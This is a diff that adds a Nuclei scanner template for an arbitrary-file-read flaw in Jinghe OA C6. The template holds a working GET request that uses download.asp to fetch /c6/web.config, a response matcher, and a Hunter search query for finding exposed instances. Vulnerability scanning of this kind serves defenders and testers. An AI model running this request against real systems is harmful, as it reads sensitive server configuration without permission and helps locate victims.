@@ -1,0 +1,27 @@
+# Add your nuclei formatted PoC!
+id: jinghe-oac6-LFI
+info:
+  name: jinghe-oac6-LFI
+  author: yoyo
+  severity: critical
+  description: 金和OA-C6版本download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息
+  tags: oa,金和oa
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "httpRuntime"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+#hunter-query:app="金和网络-金和oa"
